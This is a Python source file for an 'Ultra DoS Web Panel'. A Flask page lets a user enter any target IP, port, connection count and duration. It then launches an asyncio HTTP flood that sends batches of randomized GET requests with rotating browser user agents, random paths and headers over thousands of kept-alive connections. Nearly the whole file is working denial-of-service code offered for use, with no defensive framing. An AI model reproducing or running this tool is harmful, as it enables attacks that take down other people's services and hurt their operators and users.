#!/usr/bin/env python3
"""
Full web interface for Ultra DoS attack using Flask.
Includes real-time stats via Server-Sent Events (SSE) or JSON polling.
Run: python3 web_ultra_dos.py
"""

import asyncio
import random
import time
import threading
import json
from flask import Flask, render_template_string, request, jsonify, Response, stream_with_context

# ---------- ATTACK ENGINE (copied from ultra_dos.py) ----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

EXTRA_HEADERS = [
    "Accept-Encoding: gzip, deflate, br",
    "Accept-Language: en-US,en;q=0.9,ru;q=0.8",
    "Cache-Control: no-cache, no-store, must-revalidate",
    "Pragma: no-cache",
    "DNT: 1",
    "Upgrade-Insecure-Requests: 1",
    "Sec-Fetch-Dest: document",
    "Sec-Fetch-Mode: navigate",
    "Sec-Fetch-Site: none",
    "Sec-Fetch-User: ?1"
]

stats = {
    'running': False,
    'total_requests': 0,
    'total_bytes': 0,
    'active_conns': 0,
    'failed_conns': 0,
    'start_time': 0,
    'target': '',
    'duration': 0
}

stop_event = None
attack_thread = None

def random_path():
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'
    length = random.randint(10, 35)
    return '/' + ''.join(random.choices(chars, k=length))

def random_query():
    if random.random() < 0.4:
        params = []
        for _ in range(random.randint(1, 6)):
            k = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
            v = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(3, 12)))
            params.append(f"{k}={v}")
        return '?' + '&'.join(params)
    return ''

def random_fragment():
    if random.random() < 0.15:
        return '#' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
    return ''

def build_request(target_ip):
    path = random_path() + random_query() + random_fragment()
    ua = random.choice(USER_AGENTS)
    headers = random.sample(EXTRA_HEADERS, k=random.randint(2, 4))
    rand_header = f"X-{random.randint(1000,9999)}: {''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(8,25)))}"
    headers.append(rand_header)
    header_str = '\r\n'.join(headers)
    req = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\n{header_str}\r\nConnection: keep-alive\r\n\r\n"
    return req.encode()

async def flood_worker(target_ip, target_port, stop_evt, req_per_conn=9999999):
    while not stop_evt.is_set():
        try:
            reader, writer = await asyncio.open_connection(target_ip, target_port)
            stats['active_conns'] += 1
            sent = 0
            while not stop_evt.is_set() and sent < req_per_conn:
                batch_size = random.randint(10, 25)
                batch = b''
                for _ in range(batch_size):
                    if stop_evt.is_set() or sent >= req_per_conn:
                        break
                    batch += build_request(target_ip)
                    sent += 1
                    stats['total_requests'] += 1
                if batch:
                    try:
                        writer.write(batch)
                        await writer.drain()
                        stats['total_bytes'] += len(batch)
                    except:
                        break
                    await asyncio.sleep(0.00001)
                else:
                    break
            writer.close()
            await writer.wait_closed()
            stats['active_conns'] -= 1
        except:
            stats['failed_conns'] += 1
            await asyncio.sleep(0.01 * (1 + stats['failed_conns'] % 10))
            continue
        if not stop_evt.is_set():
            await asyncio.sleep(0.001)

async def attack_async(target_ip, target_port, total_conns, duration_sec, req_per_conn=9999999):
    global stop_event
    stats['running'] = True
    stats['start_time'] = time.time()
    stats['total_requests'] = 0
    stats['total_bytes'] = 0
    stats['active_conns'] = 0
    stats['failed_conns'] = 0
    stats['target'] = f"{target_ip}:{target_port}"
    stats['duration'] = duration_sec

    stop_evt = asyncio.Event()
    stop_event = stop_evt
    workers = [asyncio.create_task(flood_worker(target_ip, target_port, stop_evt, req_per_conn)) for _ in range(total_conns)]

    await asyncio.sleep(duration_sec)
    stop_evt.set()
    await asyncio.gather(*workers, return_exceptions=True)
    stats['running'] = False

def run_attack(target_ip, target_port, total_conns, duration_sec, req_per_conn):
    asyncio.run(attack_async(target_ip, target_port, total_conns, duration_sec, req_per_conn))

# ---------- FLASK APP ----------
app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ultra DoS Web Panel</title>
    <style>
        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 800px; margin: auto; background: #111; padding: 25px; border: 1px solid #00ff88; border-radius: 10px; }
        h2 { color: #ff3366; text-shadow: 0 0 10px #ff3366; }
        .row { display: flex; justify-content: space-between; margin: 10px 0; }
        label { color: #aaa; width: 150px; }
        input { width: 200px; padding: 8px; background: #222; border: 1px solid #00ff88; color: #fff; border-radius: 4px; }
        button { background: #ff0033; color: #fff; padding: 14px 40px; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; }
        button:disabled { background: #444; cursor: not-allowed; }
        #stats { margin-top: 20px; background: #1a1a1a; padding: 15px; border-radius: 6px; }
        .stat-line { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding: 4px 0; }
        .stat-value { color: #00ffaa; font-weight: bold; }
        .running { color: #ff4444; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.3; } }
    </style>
</head>
<body>
<div class="container">
    <h2>⚡ ULTRA DOS WEB PANEL</h2>
    <div class="row"><label>Target IP:</label><input type="text" id="ip" value="192.168.1.1"></div>
    <div class="row"><label>Port:</label><input type="number" id="port" value="80"></div>
    <div class="row"><label>Connections:</label><input type="number" id="conns" value="3000"></div>
    <div class="row"><label>Duration (sec):</label><input type="number" id="duration" value="60"></div>
    <div class="row"><label>Req per conn:</label><input type="number" id="reqper" value="9999999"></div>
    <button id="startBtn">🔥 LAUNCH ATTACK</button>
    <div id="stats">
        <div class="stat-line"><span>Status:</span><span id="statusText" class="stat-value">IDLE</span></div>
        <div class="stat-line"><span>Target:</span><span id="targetStat" class="stat-value">-</span></div>
        <div class="stat-line"><span>Total Requests:</span><span id="reqStat" class="stat-value">0</span></div>
        <div class="stat-line"><span>Total Bytes:</span><span id="bytesStat" class="stat-value">0 MB</span></div>
        <div class="stat-line"><span>Active Connections:</span><span id="connStat" class="stat-value">0</span></div>
        <div class="stat-line"><span>Failed Conns:</span><span id="failStat" class="stat-value">0</span></div>
        <div class="stat-line"><span>Elapsed:</span><span id="timeStat" class="stat-value">0s</span></div>
        <div class="stat-line"><span>RPS:</span><span id="rpsStat" class="stat-value">0</span></div>
    </div>
</div>
<script>
    function updateStats() {
        fetch('/stats')
            .then(res => res.json())
            .then(data => {
                document.getElementById('statusText').textContent = data.running ? 'ATTACKING' : 'IDLE';
                document.getElementById('statusText').style.color = data.running ? '#ff4444' : '#00ffaa';
                document.getElementById('targetStat').textContent = data.target || '-';
                document.getElementById('reqStat').textContent = data.total_requests || 0;
                document.getElementById('bytesStat').textContent = (data.total_bytes / 1048576).toFixed(2) + ' MB';
                document.getElementById('connStat').textContent = data.active_conns || 0;
                document.getElementById('failStat').textContent = data.failed_conns || 0;
                let elapsed = data.running ? Math.floor((Date.now()/1000) - data.start_time) : 0;
                document.getElementById('timeStat').textContent = elapsed + 's';
                let rps = elapsed > 0 ? Math.round(data.total_requests / elapsed) : 0;
                document.getElementById('rpsStat').textContent = rps;
            });
    }
    setInterval(updateStats, 500);

    document.getElementById('startBtn').addEventListener('click', function() {
        const ip = document.getElementById('ip').value.trim();
        const port = parseInt(document.getElementById('port').value);
        const conns = parseInt(document.getElementById('conns').value);
        const duration = parseInt(document.getElementById('duration').value);
        const reqper = parseInt(document.getElementById('reqper').value);
        if (!ip || isNaN(port) || isNaN(conns) || isNaN(duration) || conns <= 0 || duration <= 0) {
            alert('Invalid parameters');
            return;
        }
        const btn = this;
        btn.disabled = true;
        btn.textContent = 'STARTING...';
        fetch('/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip, port, conns, duration, reqper })
        })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'ok') {
                btn.textContent = 'RUNNING...';
                setTimeout(() => {
                    btn.disabled = false;
                    btn.textContent = '🔥 LAUNCH ATTACK';
                }, duration * 1000 + 3000);
            } else {
                alert('Error: ' + data.message);
                btn.disabled = false;
                btn.textContent = '🔥 LAUNCH ATTACK';
            }
        })
        .catch(err => {
            alert('Request failed');
            btn.disabled = false;
            btn.textContent = '🔥 LAUNCH ATTACK';
        });
    });
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/stats')
def stats_endpoint():
    return jsonify({
        'running': stats['running'],
        'total_requests': stats['total_requests'],
        'total_bytes': stats['total_bytes'],
        'active_conns': stats['active_conns'],
        'failed_conns': stats['failed_conns'],
        'start_time': int(stats['start_time']),
        'target': stats['target'],
        'duration': stats['duration']
    })

@app.route('/start', methods=['POST'])
def start_attack_endpoint():
    global attack_thread
    if stats['running']:
        return jsonify({'status': 'error', 'message': 'Attack already running'})
    data = request.get_json()
    ip = data.get('ip')
    port = int(data.get('port'))
    conns = int(data.get('conns'))
    duration = int(data.get('duration'))
    reqper = int(data.get('reqper', 9999999))
    if not ip or port <= 0 or conns <= 0 or duration <= 0:
        return jsonify({'status': 'error', 'message': 'Invalid params'})
    # Run in background thread
    attack_thread = threading.Thread(target=run_attack, args=(ip, port, conns, duration, reqper))
    attack_thread.daemon = True
    attack_thread.start()
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
    except:
        pass
    print("[*] Starting web server on http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
